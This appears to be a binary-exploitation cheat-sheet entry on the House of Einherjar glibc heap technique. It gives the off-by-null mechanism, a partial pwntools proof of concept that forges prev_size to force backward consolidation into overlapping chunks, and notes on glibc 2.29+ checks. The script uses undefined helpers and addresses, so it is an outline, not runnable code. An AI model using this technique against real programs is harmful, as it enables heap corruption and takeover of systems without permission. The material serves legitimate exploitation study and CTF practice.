# House of Einherjar

**When**: Off-by-one null byte overflow into the next chunk's size field.
**Primitive needed**: Null byte write at chunk boundary (common: `strcpy`, `fgets` with exact length).
**Result**: Overlapping chunks → read/write over adjacent allocations.

## Mechanism
The null byte clears the `PREV_IN_USE` bit of the next chunk. By also controlling the `prev_size` field, you trick `free()` into backward-consolidating with a fake "previous" chunk, creating an overlapping allocation.

## PoC
```python
# IN: off-by-null on a heap chunk (e.g., write exactly buf_size+1 bytes with null terminator)
# OUT: overlapping chunk that spans multiple allocations
from pwn import *

context.binary = elf = ELF('./binary')
p = process('./binary')

# Step 1: Set up chunks
a = alloc(0, 0x88)    # chunk A — will be the "fake previous"
b = alloc(1, 0x88)    # chunk B — barrier
c = alloc(2, 0x448)   # chunk C — large, will be freed into unsorted bin
d = alloc(3, 0x18)    # chunk D — prevent top consolidation

# Step 2: Free A so it goes to unsorted bin
free(0)

# Step 3: Overflow from B into C's header
# The null byte at C's size LSB clears PREV_IN_USE
# Set C's prev_size = offset from A to C (so consolidation merges A through C)
distance = c_addr - a_addr  # compute from heap leak
edit(1, b'A'*0x80 + p64(distance) + b'\x00')
#                   ^prev_size      ^null byte clears PREV_IN_USE of C

# Step 4: Free C — glibc backward-consolidates with A
# The merged chunk spans A, B, and C
free(2)

# Step 5: Allocate from the merged chunk — overlaps with B
e = alloc(4, 0x88)    # returns part overlapping with B's data
# Now chunk 4 and chunk 1 overlap — read/write via either
```

## Trap
- Need a heap address leak to compute `prev_size` correctly.
- The fake prev_size must exactly equal the distance to a previously-freed chunk.
- glibc 2.29+ added `prev_size` vs `chunk_size` consistency checks — need `prev_size == freed_chunk_size` exactly.
- Allocate a guard chunk (D) after C to prevent top-chunk consolidation.
